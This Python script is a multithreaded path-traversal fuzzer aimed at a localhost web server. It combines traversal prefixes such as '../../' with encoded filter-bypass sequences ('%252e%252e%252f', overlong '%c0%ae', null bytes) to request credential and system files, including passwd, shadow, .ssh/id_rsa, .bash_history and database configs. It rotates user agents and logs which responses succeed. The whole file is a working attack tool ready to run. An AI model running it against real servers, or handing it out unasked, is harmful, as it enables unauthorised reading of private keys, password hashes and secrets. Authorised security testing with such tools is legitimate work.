import requests
import csv
import time
import itertools
import random
import json
import datetime
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import RequestException
from logging import getLogger, FileHandler, INFO
from threading import Lock

# Create a logger
logger = getLogger("fuzzer_logger")
logger.addHandler(FileHandler("path_traversal.log"))
logger.setLevel(INFO)

# Constants moved to the top
USER_AGENTS = ["Mozilla/5.0", "Safari/537.36", "Chrome/91.0.4472.124"]
CSV_FILE = 'path_traversal.csv'
BASE_URL = 'http://127.0.0.1:8080'
RETRY_DELAY = 1
REQUEST_TIMEOUT = 5
THREAD_COUNT = 50
MAX_RETRIES = 3

# Fuzzing options
paths = ['../', '../../', './', '.', '..', '../../../', '../../../../', '../../../../../', '../../../../../../']

sensitive_files = ['passwd', 'shadow', 'config.php', 'mysql.cnf', 'web.config', 'htaccess', 'ssh/authorized_keys',
                '.bash_history', '.ssh/id_rsa', '.ssh/id_dsa', '.ssh/identity', 'boot.ini', 'win.ini',
                'php.ini', 'httpd.conf', 'mysql.conf', 'proftpd.conf', 'pure-ftpd.conf', 'wu-ftpd.conf']

extensions = ['', '.php', '.txt', '.db', '.json', '.bak', '.swp', '.old', '.conf', '/',
            '.ini', '.htpasswd', '.log', '.tar.gz', '.tar', '.zip', '.git', '.svn']

special_chars = ['%00', '%2e%2e%2f', '%252e%252e%252f', '.%2e/', '..%2f', '%2e.', '../', '..\\',
                '%c0%ae%c0%ae/', '%uff0e%uff0e%u2216', '%c0%ae/', '%c0%ae%c0%ae\\']

# Generate all combinations of paths, sensitive files, extensions and special characters
fuzz_cases = list(itertools.product(paths, sensitive_files, extensions, special_chars))
random.shuffle(fuzz_cases)

session = requests.Session()

csv_lock = Lock()

def send_request(fuzz_case):
    path, file, ext, char = fuzz_case
    fuzzed_path = path + file + ext + char
    url = f'{BASE_URL}/{fuzzed_path}'
    user_agent = random.choice(USER_AGENTS)
    headers = {"User-Agent": user_agent}

    for i in range(MAX_RETRIES):
        try:
            timestamp = datetime.datetime.now().isoformat()
            response = session.get(url, headers=headers, timeout=REQUEST_TIMEOUT)
            elapsed_time = response.elapsed.total_seconds()
            response_size = len(response.content)
            status_code = response.status_code
            response_headers = json.dumps(dict(response.headers))

            with csv_lock:
                log_to_csv([timestamp, fuzzed_path, status_code, elapsed_time, response_size, response_headers])
            
            logger.info(f'Fuzzed path: {fuzzed_path}.')
            return

        except RequestException as e:
            logger.warning(f"RequestException for path: {fuzzed_path}. Retrying... {str(e)}")
            time.sleep(RETRY_DELAY * (2 ** i))  # exponential backoff

        except Exception as e:
            logger.error(f"Unexpected error occurred for path: {fuzzed_path}. Retrying... {str(e)}")
            time.sleep(RETRY_DELAY * (2 ** i))

def log_to_csv(data):
    with open(CSV_FILE, 'a', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(data)

if __name__ == '__main__':
    try:
        headers = ['Timestamp', 'Path', 'Status Code', 'Time Taken', 'Response Size', 'Response Headers']
        log_to_csv(headers)

        with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
            executor.map(send_request, fuzz_cases)
            
    except Exception as e:
        logger.error(f"An error occurred: {str(e)}")
